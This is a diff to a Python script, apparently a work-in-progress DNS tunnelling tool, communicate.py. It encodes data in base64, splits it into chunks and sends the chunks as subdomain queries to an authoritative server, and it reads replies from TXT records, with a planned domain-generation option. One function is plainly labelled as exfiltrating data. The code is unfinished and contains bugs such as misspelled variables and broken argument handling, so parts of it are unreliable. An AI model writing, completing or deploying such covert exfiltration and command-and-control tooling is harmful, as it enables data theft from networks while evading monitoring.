@@ -10,8 +10,6 @@ import dns.resolver
 
 # <Fucntion of ability>
 ## - confirm the number of required request packets -> use subdomain by 'mail'
-## - select both generated domain(DGA) and specific domain
-## - select the type of decode from [base32, base64, base85]
 ## - specify the time of interval
 ## - embed the message as subdomain
 # <Scenario>
@@ -24,59 +22,71 @@ import dns.resolver
 ## - 'mail' : calculate the number of required packets
 ##   * your auth server embeds the size and the number of packet in TXT RR
 ## - 'www'  : request the message in TXT RR
+# <Definition of veriable>
+## - ex) www.google.com
+## - domain : 'google.com'
+## - subdomain(message) : 'www'
+## - message : outbound. from client to server
+## - answer  : inbound. from server to client
 
-# def dga():
-#     pass
+def control_argment():
+    parser = argparse.ArgumentParser(
+                    usage='communicate.py [-h] [-s(specify) <hostname>|-d(DGA)]'\
+                          '[-i(interval {s}) <60>] [-m(message]',\
+                    description='Get the value of domain verification')
+    parser.add_argument('-s', '--specify', help='specify the target host', \
+                        action='store_true')
+    parser.add_argument('-d', '--dga', help='use domain genelation algrorithm', \
+                        action='store_true')
+    parser.add_argument('-i', '--interval', help='difine the interval time of \
+                        request packet', action='store_true')
+    parser.add_argument('-m', '--message', help='define the message as subdomain',\
+                        action='store_true')
 
-def parse(msg:str, length:int=10) ->list:
+
+    args = parser.parse_args()
+
+    res = {}
+    if args.specify:
+        domain = args.domain
+        res['domain'] = domain
+    if args.dga:
+        # call DGA function
+        pass
+    if args.interval:
+        interval = args.interval
+        return 
+    if args.message:
+        message = args.message
+        res['subdomain'] = message
+    return res
+
+
+def parse_message(message:str, length:int=10) ->list:
     """
-    * split the message after encoding it to base64
-    * make the list of splited messages
-    - control the number of packets based of the response packet size
-    # if you decode the message, put on '=' in the end after comine the line
+    1. Encode the message to base64
+    2. make the list of the message split by the length
+    * if you decode the message, put on '=' in the end after comine the line
     """
-    encoded = base64.b64encode(msg.encode()).decode().strip('=')
+    encoded = base64.b64encode(message.encode()).decode().strip('=')
     response = [encoded[i: i+lentgh] for i in range(0, len(encoded), length)]
     return response
 
+def send(message:str, hostname:str):
+    """exfiltrate the data using by subdomain"""
+    try:
+        qname = message + '.' + hostname
+        dns.resolver.query(qname, 'A')
+    except:
+        print("Can't send or no RR")
+
 def query(message:list, hostname:str, interval:int) ->list:
-    """
-    - deal with the number of requesting messages
-    - send the query message to the auth server
-    - handle RR based on the query message
-    - 'A' means data exfiltration
-    - 'TXT' means expanding the function
-    """
-    # Query the DNS request to the auth server
-    if len(message) == 1:
-        payload = [message + '.' + hostname]
-        if message == 'mail' or 'www':
-            try:
-                dns.resolver.query(payload, 'A')
-                # if it needs, use the below script
-                # return str(answer).strip('>]').split(' ')[-1]
-            except:
-                pass
-            return 0
-
-        else:
-            response = dns.resolver.query(payload, 'TXT')
-            verification_line = [str(i).split('=') for i in response[:]\
-                                if 'verification' in str(i)]
-            return verification_line
-
-    elif len(message) == 0:
-        return 0
-    else:
-        payload = [msg + '.' + hostname for msg in message]
-        for i in payload:
-            try:
-                dns.resolver.query(payload, 'A')
-            except:
-                continue
-            time.sleep(interval)
-        return 0
-
+    """query the value in the TXT"""
+    payload = message + '.' + hostname
+    response = dns.resolver.query(payload, 'TXT')
+    verification_line = [str(i).split('=') for i in response[:]\
+                        if 'verification' in str(i)]
+    return verification_line
 
 def decipher(answer: list) ->str:
     """
@@ -91,40 +101,14 @@ def decipher(answer: list) ->str:
 
     pass
 
-def main(qname: str) -> str:
-    answer = request(query)
-    print(answer)
+def main():
+    argment = control_argment()
+    print(argment[:])
+
+    # Based on the artment, execute the functions
+
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(
-                    usage='communicate.py [-h] [-s(specify) <hostname>|-d(DGA)]'\
-                          '[-t(decode_type) <base*>] [-i(interval {s}) <60>]',\
-                    description='Get the value of domain verification')
-    parser.add_argument('-s', '--specify', help='specify the target host', \
-                        action='store_true')
-    parser.add_argument('-d', '--dga', help='use domain genelation algrorithm', \
-                        action='store_true')
-    parser.add_argument('-t', '--decode_type', help='difine the type of decode', \
-                        action='store_true')
-    parser.add_argument('-i', '--interval', help='difine the interval time of \
-                        request packet', action='store_true')
-    parser.add_argument('-c', '--', help='define the messages into subdomain',\
-                        action='store_true')
+    main()
 
-
-    args = parser.parse_args()
-    if args.specify:
-        domain = args.domain
-        # call function
-    if args.dga:
-        # call DGA function
-        pass
-    if args.decode_type:
-        decode = args.decode_type
-    if args.interval:
-        interval = args.interval
-    if args.message:
-        message = args.message
-
-    response = parse(message)
